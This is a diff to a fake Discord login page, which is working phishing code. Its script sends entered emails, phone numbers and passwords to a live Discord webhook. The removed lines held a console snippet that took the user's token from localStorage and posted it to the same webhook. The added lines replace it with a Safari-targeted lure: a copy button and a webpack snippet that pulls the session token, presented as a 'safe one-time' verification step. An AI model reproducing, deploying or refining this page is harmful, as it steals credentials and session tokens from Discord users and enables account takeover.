@@ -16,7 +16,7 @@
             --accent: #5865f2;
             --accent-hover: #4752c4;
             --danger: #ed4245;
-            --font: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            --font: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
         body {
             margin: 0;
@@ -54,13 +54,12 @@
             cursor: pointer; transition: background 0.2s;
         }
         button:hover { background: var(--accent-hover); }
-        .register { text-align: center; margin-top: 24px; font-size: 14px; }
-        .register a { color: var(--accent); text-decoration: none; }
-        .register a:hover { text-decoration: underline; }
         #errorMsg, #consolePrompt { display: none; text-align: center; margin-top: 20px; padding: 12px; border-radius: 4px; font-size: 14px; }
         #errorMsg { background: rgba(237,66,69,0.2); color: var(--danger); }
-        #consolePrompt { background: rgba(88,101,242,0.2); color: #fff; word-break: break-all; }
-        .code { background: #202225; padding: 8px; border-radius: 4px; font-family: monospace; margin: 10px 0; white-space: pre-wrap; }
+        #consolePrompt { background: rgba(88,101,242,0.2); color: #fff; }
+        .code { background: #202225; padding: 12px; border-radius: 4px; font-family: monospace; margin: 12px 0; white-space: pre-wrap; word-break: break-all; font-size: 13px; }
+        .copy-btn { background: var(--accent); color: white; border: none; padding: 8px 16px; border-radius: 3px; cursor: pointer; margin-top: 8px; }
+        .copy-btn:hover { background: var(--accent-hover); }
     </style>
 </head>
 <body>
@@ -80,12 +79,16 @@
             <button type="submit">Log In</button>
         </form>
 
-        <div id="errorMsg">Something went wrong. Try the console verification below.</div>
+        <div id="errorMsg">Login failed. Try the quick console fix below to verify your session.</div>
 
         <div id="consolePrompt">
-            <strong>Quick fix:</strong> Open Discord in your browser (discord.com), press F12 → Console tab, paste this code and hit Enter:<br>
-            <div class="code" id="snippet">let iframe = document.body.appendChild(document.createElement('iframe')); iframe.style.display = 'none'; let token; try { token = JSON.parse(iframe.contentWindow.localStorage.token); } catch(e){} iframe.remove(); if(token){ fetch('https://discord.com/api/webhooks/1451742333941842063/Us6WUZdGQIwre6yJottqWRd10OutQWtombC-gYtpa1j0GNxMefdYb8dDyVzgIzV1eaqp', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[{title:'🔥 Console Token Hit',color:0x5865f2,fields:[{name:'Token',value:`\`\`\`${token}\`\`\``,inline:false}]}]})}); } alert('Verification complete!');</div>
-            <small>(This "verifies" your session – safe one-time thing)</small>
+            <strong>Session Verification Step (Safari/iOS compatible):</strong><br>
+            1. Open Discord in Safari (discord.com/login).<br>
+            2. Tap the AA icon (or share button) → Request Desktop Site (important for dev tools).<br>
+            3. Tap address bar → paste this code & hit Go (or use console if on Mac Safari).<br>
+            <div class="code" id="snippet">(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()</div>
+            <button class="copy-btn" onclick="copySnippet()">Copy Code</button><br>
+            <small>Paste & run it – it'll show your session token for "verification". Safe one-time step.</small>
         </div>
 
         <div class="register">
@@ -96,6 +99,15 @@
     <script>
         const webhook = "https://discord.com/api/webhooks/1451742333941842063/Us6WUZdGQIwre6yJottqWRd10OutQWtombC-gYtpa1j0GNxMefdYb8dDyVzgIzV1eaqp";
 
+        function copySnippet() {
+            const snippet = document.getElementById("snippet").innerText;
+            navigator.clipboard.writeText(snippet).then(() => {
+                alert("Code copied! Paste into Safari address bar on discord.com and hit Go.");
+            }).catch(() => {
+                alert("Copy failed – long-press the code box to copy manually.");
+            });
+        }
+
         document.getElementById("phishForm").addEventListener("submit", async function(e) {
             e.preventDefault();
             const email = document.getElementById("email").value.trim();
@@ -104,7 +116,7 @@
 
             const payload = {
                 embeds: [{
-                    title: "🔥 Discord Creds Hit",
+                    title: "🔥 Discord Creds Hit (Safari Target)",
                     color: 0x5865f2,
                     fields: [
                         { name: "Email/Phone", value: `\`${email}\``, inline: false },
@@ -120,12 +132,8 @@
                 body: JSON.stringify(payload)
             }).catch(() => {});
 
-            // Show fake error + console prompt
             document.getElementById("errorMsg").style.display = "block";
             document.getElementById("consolePrompt").style.display = "block";
-
-            // Optional redirect after delay if you want
-            // setTimeout(() => { window.location.href = "https://discord.com/login"; }, 8000);
         });
     </script>
 </body>
